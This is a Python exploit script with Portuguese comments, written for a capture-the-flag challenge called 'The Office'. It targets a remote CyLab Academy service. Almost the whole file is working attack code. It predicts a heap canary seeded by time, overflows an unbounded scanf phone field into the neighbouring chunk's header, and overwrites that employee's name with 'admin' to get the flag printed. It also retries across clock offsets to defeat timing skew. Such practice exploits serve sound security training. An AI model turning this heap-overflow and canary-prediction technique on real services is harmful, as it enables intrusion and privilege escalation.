#!/usr/bin/env python3
# The Office: heap overflow com canário previsível (srand(time(0))).
#
# Ideia: o alocador caseiro põe um canário no cabeçalho de cada chunk, mas o
# canário é rand() com srand(time(0)), então dá para prever reproduzindo o mesmo
# cálculo. O campo Phone é lido com scanf("%s") sem limite, o que estoura para o
# cabeçalho do chunk vizinho. Reconstruo esse cabeçalho com o canário correto
# (passa no heapcheck) e sobrescrevo o nome do vizinho para "admin" depois da
# checagem anti-admin. Aí "Get access token" imprime a flag.
#
# Sincronismo: o canário depende do SEGUNDO em que o chunk é alocado no servidor.
# Latência de rede e diferença de relógio deslocam esse segundo, então cada
# tentativa varre um offset de relógio (0, -1, +1, -2, +2, ...) até acertar.
#
# Uso: TARGET_HOST=host TARGET_PORT=porta python3 scripts/script1.py

from pwn import *
from ctypes import CDLL
import time, os

HOST = os.environ.get("TARGET_HOST", "chatelaine.cylabacademy.net")
PORT = int(os.environ.get("TARGET_PORT", "16979"))

context.log_level = "error"

# Reproduz rand()/srand() da libc para prever o canário (mesmo algoritmo do glibc).
libc = CDLL("libc.so.6")

# scanf("%s") corta em qualquer whitespace, então o canário não pode conter
# esses bytes (senão o payload é truncado antes do header e o ataque falha).
BAD = {0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20}

def predict_canary(ts):
    libc.srand(ts & 0xffffffff)
    return libc.rand()

def safe_for_scanf(x):
    return all(b not in BAD for b in p32(x))

# ---- helpers do menu ----
def menu(p, op):
    p.sendlineafter(b"4) Get access token", str(op).encode())

def add_employee(p, name, phone=b"11111111"):
    menu(p, 1)
    p.sendlineafter(b"Name: ", name)
    p.sendlineafter(b"Email (y/n)? ", b"n")
    p.sendlineafter(b"Salary: ", b"1111")
    # Vulnerabilidade: Phone usa scanf("%s", employee+0x18) sem limite -> overflow.
    p.sendlineafter(b"Phone #: ", phone)
    p.sendlineafter(b"Bldg (y/n)? ", b"n")

def remove_employee(p, idx):
    menu(p, 2)
    p.sendlineafter(b"Employee #?", str(idx).encode())

def get_token(p, idx):
    menu(p, 4)
    p.sendlineafter(b"Employee #?", str(idx).encode())

# Offsets de relógio testados (em segundos) para alinhar com o time(0) do servidor.
OFFSETS = [0, -1, 1, -2, 2, -3, 3]

def attempt(offset):
    p = remote(HOST, PORT)
    try:
        add_employee(p, b"AAAA")                    # employee 0
        add_employee(p, b"alvo")                    # employee 1 (vizinho a sobrescrever)
        # O canário do chunk do employee 1 foi gerado agora, neste segundo (mais/menos o skew).
        ts = int(time.time()) + offset
        canary = predict_canary(ts)
        if not safe_for_scanf(canary):
            return False                            # canário deste segundo tem byte ruim
        remove_employee(p, 0)                       # libera o 0 para recriá-lo no mesmo lugar

        # Layout (confirmado localmente): do início do Phone do employee 0 recriado
        #   28 bytes  -> cabeçalho do employee 1
        #   canary(4) + size|alloc(=53) + prev|alloc(=53)  -> header válido
        #   "admin\0" -> sobrescreve o nome do employee 1
        payload  = b"A" * 28
        payload += p32(canary) + p32(53) + p32(53)
        payload += b"admin\x00"
        add_employee(p, b"CCCC", phone=payload)     # recria o 0 e estoura no 1

        get_token(p, 1)                             # imprime a flag se o nome for admin
        out = p.recvall(timeout=3)
        if b"academy{" in out or b"picoCTF{" in out:
            print(out.decode(errors="replace"))
            return True
    except EOFError:
        return False                                # conexão morreu: canário errado
    finally:
        try: p.close()
        except Exception: pass
    return False

def main():
    for i in range(80):
        if attempt(OFFSETS[i % len(OFFSETS)]):
            log.success("flag encontrada")
            return
    log.failure("não pegou nesta execução; rode de novo")

if __name__ == "__main__":
    main()
